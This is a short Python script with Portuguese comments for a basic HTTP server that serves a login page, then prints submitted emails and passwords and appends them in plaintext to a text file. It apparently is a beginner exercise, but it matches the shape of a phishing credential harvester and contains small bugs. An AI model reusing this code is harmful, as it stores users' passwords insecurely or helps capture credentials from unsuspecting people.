# importa o módulo http.server
import os
from http.server import SimpleHTTPRequestHandler
import socketserver
from urllib.parse import parse_qs


class MyHandler(SimpleHTTPRequestHandler):
    def list_directory(self, path):
        try:
            with open(os.path.join(path, 'index.html'), 'r', encoding='utf-8') as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(f.read().encode('utf-8'))
            return None
        except FileNotFoundError:
            pass

        return super().list_directory(path)

    def do_GET(self):
        if self.path == '/login':
            try:
                with open(os.path.join(os.getcwd(), 'login.html'), 'r', encoding='utf-8') as login_file:
                    content = login_file.read()
                self.send_response(200)
                self.send_header('Content type', 'text/html')
                self.end_headers()
                self.wfile.write(content.encode('utf-8'))
            except FileNotFoundError:
                self.send_error(404, 'File Not Found')
        else:
            # se não achar a rota "/login", continua o comportamento padrão
            super().do_GET()

    def do_POST(self):
        # verifica se a rota é "/enviar_login"
        if self.path == "/enviar_login":
            # obtém o comprimento do corpo da requisição
            content_length = int(self.headers['Content-Length'])
            # le o corpo da aquisição
            body = self.rfile.read(content_length).decode('utf-8')
            # parseia os dados do formulário
            form_data = parse_qs(body)

            # exibe os dados no terminal
            print("Dados do formulário:")
            print("Email:", form_data.get('email', [''])[0])
            print("Senha:", form_data.get('password', [''])[0])

            # armazena 
            with open ('dados_login.txt', 'a') as file:
                login = form_data.get('email', [''])[0]
                senha = form_data.get('password', [''])[0]
                file.write(f'{login};{senha}\n')

            # responde ao cliente
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write("Dados recebidos com sucesso!".encode('utf-8'))

        else:
            # se não for a rota "/login", continua com o comportamento padrão
            super(MyHandler, self).do_POST()


# define a porta a ser utilizada
endereco_ip = "0.0.0.0"
porta = 8000

# configura o manipulador (handler) para o servidor
# handler = http.server.SimpleHTTPRequestHandler

# cria um servidor na porta especificada
with socketserver.TCPServer(("", porta), MyHandler) as httpd:
    print(f"Servidor iniciado na porta {porta}.")
    # mantém o servidor em execução
    httpd.serve_forever()
